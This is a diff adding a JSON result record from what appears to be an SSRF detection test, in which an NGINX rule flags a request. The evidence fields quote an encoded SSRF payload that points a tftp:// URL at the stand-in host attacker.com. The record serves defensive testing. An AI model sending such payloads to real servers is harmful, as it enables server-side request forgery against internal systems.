@@ -1,0 +1,17 @@
+{
+  "pattern_id": "SSRF_SCHEME_004",
+  "test_id": "SSRF_SCHEME_004-1771076707856-2zpnum",
+  "category": "ssrf",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 6000,
+  "evidence": "13:45:07.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_004-1771076707856-2zpnum pattern_id=SSRF_SCHEME_004 uri=/?q=tftp%3A%2F%2Fattacker.com%2Ffile client=127.0.0.1",
+  "rule_name": "[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_004-1771076707856-2zpnum pattern_id=SSRF_SCHEME_004 uri=/?q=tftp%3A%2F%2Fattacker.com%2Ffile client=127.0.0.1",
+  "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_SCHEME_004-1771076707856-2zpnum pattern_id=SSRF_SCHEME_004 uri=/?q=tftp%3A%2F%2Fattacker.com%2Ffile client=127.0.0.1",
+  "sent_at": 1771076713000,
+  "detected_at": 1771076707000,
+  "status": "passed"
+}
